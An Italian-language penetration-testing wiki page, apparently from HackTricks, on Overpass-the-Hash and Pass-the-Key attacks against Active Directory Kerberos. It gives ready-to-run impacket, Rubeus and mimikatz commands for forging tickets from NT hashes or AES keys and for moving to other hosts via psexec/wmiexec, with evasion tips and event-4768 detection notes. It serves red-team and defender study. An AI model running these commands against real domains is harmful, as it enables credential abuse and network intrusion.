# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

L'attacco **Overpass The Hash/Pass The Key (PTK)** è progettato per ambienti in cui il protocollo NTLM tradizionale è limitato e l'autenticazione Kerberos ha la precedenza. Questo attacco sfrutta l'hash NTLM o le chiavi AES di un utente per richiedere ticket Kerberos, consentendo un accesso non autorizzato alle risorse all'interno di una rete.

In senso stretto:

- **Over-Pass-the-Hash** di solito significa trasformare l'**NT hash** in un Kerberos TGT tramite la chiave Kerberos **RC4-HMAC**.
- **Pass-the-Key** è la versione più generica in cui hai già una chiave Kerberos come **AES128/AES256** e richiedi direttamente un TGT con essa.

Questa differenza è importante in ambienti hardenizzati: se **RC4 è disabilitato** o non è più assunto dal KDC, il solo **NT hash non basta** e serve una **chiave AES** (o la password in chiaro per derivarla).

Per eseguire questo attacco, il primo passo consiste nell'acquisire l'hash NTLM o la password dell'account dell'utente target. Una volta ottenute queste informazioni, è possibile ottenere un Ticket Granting Ticket (TGT) per l'account, consentendo all'attaccante di accedere a servizi o macchine per cui l'utente ha i permessi.

Il processo può essere avviato con i seguenti comandi:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Per scenari che richiedono AES256, può essere utilizzata l'opzione `-aesKey [AES key]`:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` supporta anche la richiesta di un **service ticket direttamente tramite un AS-REQ** con `-service <SPN>`, il che può essere utile quando vuoi un ticket per uno specifico SPN senza un TGS-REQ aggiuntivo:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Inoltre, il ticket acquisito potrebbe essere impiegato con vari strumenti, tra cui `smbexec.py` o `wmiexec.py`, ampliando la portata dell'attacco.

Problemi riscontrati come _PyAsn1Error_ o _KDC cannot find the name_ vengono in genere risolti aggiornando la libreria Impacket o usando il hostname invece dell'indirizzo IP, garantendo la compatibilità con il Kerberos KDC.

Una sequenza di comandi alternativa usando Rubeus.exe dimostra un altro aspetto di questa tecnica:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Questo metodo rispecchia l'approccio **Pass the Key**, con un focus sul prendere il controllo e utilizzare direttamente il ticket per l'autenticazione. In pratica:

- `Rubeus asktgt` invia direttamente il **raw Kerberos AS-REQ/AS-REP** e **non** richiede privilegi di admin a meno che tu non voglia targettare un'altra logon session con `/luid` o crearne una separata con `/createnetonly`.
- `mimikatz sekurlsa::pth` inserisce il materiale delle credenziali in una logon session e quindi **interagisce con LSASS**, il che di solito richiede local admin o `SYSTEM` ed è più rumoroso dal punto di vista di un EDR.

Esempi con Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Per conformarsi alla operational security e usare AES256, si può applicare il seguente comando:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` è rilevante perché il traffico generato da Rubeus differisce leggermente dal Kerberos nativo di Windows. Nota anche che `/opsec` è pensato per traffico **AES256**; usarlo con RC4 di solito richiede `/force`, il che vanifica gran parte del punto perché **RC4 nei domini moderni è di per sé un forte segnale**.

## Detection notes

Ogni richiesta di TGT genera **l'evento `4768`** sul DC. Nelle build Windows attuali questo evento contiene campi più utili di quanto menzionino le vecchie guide:

- `TicketEncryptionType` indica quale enctype è stato usato per il TGT emesso. I valori tipici sono `0x17` per **RC4-HMAC**, `0x11` per **AES128** e `0x12` per **AES256**.
- Gli eventi aggiornati espongono anche `SessionKeyEncryptionType`, `PreAuthEncryptionType` e gli enctypes pubblicizzati dal client, il che aiuta a distinguere la **vera dipendenza da RC4** dai confondenti default legacy.
- Vedere `0x17` in un ambiente moderno è un buon indizio che l'account, l'host o il percorso di fallback del KDC consentono ancora RC4 e quindi sono più adatti a Over-Pass-the-Hash basato su NT-hash.

Microsoft ha ridotto progressivamente il comportamento RC4-by-default dagli aggiornamenti di hardening Kerberos di novembre 2022, e la guida pubblicata attuale è di **rimuovere RC4 come enctype predefinito assunto per gli AD DC entro la fine del Q2 2026**. Da un punto di vista offensivo, questo significa che **Pass-the-Key con AES** è sempre più il percorso affidabile, mentre il classico **NT-hash-only OpTH** continuerà a fallire più spesso in ambienti hardenizzati.

Per maggiori dettagli sui tipi di crittografia Kerberos e sul comportamento correlato dei ticket, consulta:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Ogni sessione di logon può avere un solo TGT attivo alla volta, quindi fai attenzione.

1. Crea una nuova sessione di logon con **`make_token`** da Cobalt Strike.
2. Poi, usa Rubeus per generare un TGT per la nuova sessione di logon senza influenzare quella esistente.

Puoi ottenere un isolamento simile direttamente da Rubeus con una sessione sacrificial **logon type 9**:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Questo evita di sovrascrivere il TGT della sessione corrente ed è di solito più sicuro che importare il ticket nella tua sessione di logon esistente.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
